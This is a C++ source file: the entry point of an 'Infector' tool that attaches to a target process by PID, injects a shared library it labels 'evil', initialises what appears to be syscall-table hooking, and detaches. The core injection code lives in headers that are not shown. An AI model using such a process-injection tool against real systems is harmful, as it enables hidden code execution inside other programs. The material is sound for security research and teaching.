#include "infector/infector.h"
#include "infector/cmdline.h"
#include "log/log.h"

#include <elf.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <string.h>

#include <sys/types.h>
#include <sys/wait.h>

#define LIBC_SO "libc-2.31.so"

int main(int argc, char *argv[])
{
    cmdline::parser cmd;
    cmd.add<int>("pid", 'p', "set target pid", true, 0, cmdline::range(1, 1000000));
    cmd.add<std::string>("libso", 'l', "set libso name", false, "");

    cmd.parse_check(argc, argv);

    int pid = cmd.get<int>("pid");
    const char *injectso = cmd.get<std::string>("libso").c_str();
    Infector infector(pid, LIBC_SO);
    if (!infector.attachTarget())
    {
        LOGGER_ERROR << "attachTarget";
        return 0;
    }

    infector.injectEvilSoname(injectso);

    infector.injectSysTableInit();

    if (!infector.detachTarget())
    {
        return 0;
    }
}